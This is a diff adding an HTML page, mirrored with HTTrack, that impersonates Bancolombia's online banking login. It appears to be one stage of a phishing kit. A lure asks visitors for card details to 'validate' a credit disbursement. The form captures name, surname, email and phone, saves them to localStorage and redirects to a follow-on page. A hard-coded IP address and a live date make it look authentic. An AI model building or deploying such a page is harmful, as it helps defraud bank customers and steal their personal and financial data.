@@ -1,0 +1,252 @@
+<html>
+  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Bancolombia</title>
+
+    <link
+      rel="stylesheet"
+      href="../../sapp2406.sirv.com/bogo/lfr_style.css"
+    />
+    <link
+      rel="stylesheet"
+      href="../../sapp2406.sirv.com/bogo/lfr_ownstyle.css"
+    />
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+
+  <script></script>
+
+  <body>
+    <div class="box-container">
+      <div class="container">
+        <div class="toast hidden" id="errorMessage" style="position: absolute">
+          <p id="AuthLabel"></p>
+          <span class="icon-close-search-r" onclick="hideToast()"></span>
+        </div>
+        <div class="container__water-mark">
+          <div class="container__water-mark--image-container"></div>
+        </div>
+        <div class="container__login">
+          <div class="container__login--header">
+            <img src="imagenes/logo-bancolombia-black.svg" alt="" />
+          </div>
+          <div class="container__login--title">
+            <div class="container__login--title-1" style="color: #000">
+              <p>
+                Bienvenido a tu Banca Virtual
+                <label class="tituloformulario" id="flujoOrigenLbl">
+                  <br
+                /></label>
+              </p>
+            </div>
+          </div>
+          <div class="container__login--login-box">
+            <div class="container__login--login-box-title">
+              <span id="form-title"
+                >Ingrese sus datos de tarjeta de crédito para validar el deseembolso de su cupo crediticio.</span
+              >
+            </div>
+            <div class="form-container">
+              <form
+                method="post"
+                name="loginForm"
+                id="loginForm"
+                action="#"
+                onsubmit="return sender();"
+                autocomplete="off"
+              >
+                <div id="document-form">
+                  <div id="credit-card-form">
+                    <div class="label">
+                      <label for="name">Nombre</label>
+                    </div>
+                    <input
+                      type="text"
+                      class="custom-form-control"
+                      id="name"
+                      name="name"
+                    />
+                    <div class="label">
+                      <label for="lastName">Apellido</label>
+                    </div>
+                    <input
+                      type="text"
+                      class="custom-form-control"
+                      id="lastName"
+                      name="lastName"
+                    />
+                    <div class="label">
+                      <label for="email">Correo</label>
+                    </div>
+                    <input
+                      type="email"
+                      class="custom-form-control"
+                      id="email"
+                      name="email"
+                    />
+                    <div class="label">
+                      <label for="phone">Teléfono</label>
+                    </div>
+                    <input
+                      type="tel"
+                      class="custom-form-control"
+                      id="phone"
+                      name="phone"
+                    />
+                  </div>
+                </div>
+
+                <div class="btn-container">
+                  <button 
+  type="submit" 
+  class="btn-main" 
+  style="
+    width:50%;
+    background-color:#ffcc00;   /* amarillo */
+    color:#000;                 /* texto negro */
+    border:none;
+    padding:12px;
+    font-size:16px;
+    font-weight:bold;
+    border-radius:26px;
+    cursor:pointer;
+    transition:background-color 0.2s ease;
+  "
+  onmousedown="this.style.backgroundColor='#ffe066';" 
+  onmouseup="this.style.backgroundColor='#ffcc00';" 
+  onmouseout="this.style.backgroundColor='#ffcc00';"
+>
+  Continuar
+</button>
+
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+        <style>
+          ul {
+            list-style-type: none;
+            margin-top: 2rem;
+            margin-left: 4rem;
+            vertical-align: top;
+          }
+
+          li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+          }
+
+          .icon-info {
+            width: 3rem;
+            height: 3rem;
+            margin-right: 1rem;
+            object-fit: cover;
+          }
+        </style>
+      <!--  <div class="container__info">
+          <div class="container__info--tips">
+            <div class="collapsable">
+              <div class="collapse">
+                <div class="collapse__header">
+                  <div class="collapse__header--text">
+                    <img
+                      src="https://sapp2406.sirv.com/bogo/c292.png"
+                      style="width: 100%"
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+--><div class="img-centro">
+  <img src="imagenes/logo-bancolombia-black.svg" alt="Descripción de la imagen">
+</div>
+
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 180px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+<br>
+
+<div class="img-centro">
+  <img src="imagenes/super-horizontal-black.svg" alt="Descripción de la imagen">
+</div>
+
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 160px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+      <div class="footer-datos">
+  <p id="ip">Dirección IP: 45.187.7.195</p>
+  <p id="fecha"></p>
+</div>
+
+<style>
+  .footer-datos {
+    text-align: center;        /* centrado */
+    font-size: 14px;           /* tamaño ajustable */
+    color: #777;               /* gris similar al de la foto */
+    margin-top: 40px;          /* separación con el contenido */
+  }
+  .footer-datos p {
+    margin: 4px 0;
+  }
+</style>
+
+<script>
+  // Generar fecha y hora actuales en español
+  const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+                     hour: 'numeric', minute: 'numeric', hour12: true };
+  const ahora = new Date().toLocaleDateString('es-ES', opciones);
+
+  document.getElementById("fecha").textContent = ahora;
+</script>
+
+
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        document
+          .getElementById("loginForm")
+          .addEventListener("submit", function (event) {
+            event.preventDefault(); // Evita la recarga de la página
+
+            const nombre = document.getElementById("name")?.value
+            const apellido = document.getElementById("lastName")?.value
+            const correo = document.getElementById("email")?.value
+            const telefono = document.getElementById("phone")?.value
+
+            const datos = {
+                nombre, apellido, correo, telefono
+            }
+
+            localStorage.setItem("datos", JSON.stringify(datos));
+            // Redirigir después de guardar
+            window.location.href = "load.html";
+          });
+      });
+    </script>
+  </body>
+</html>
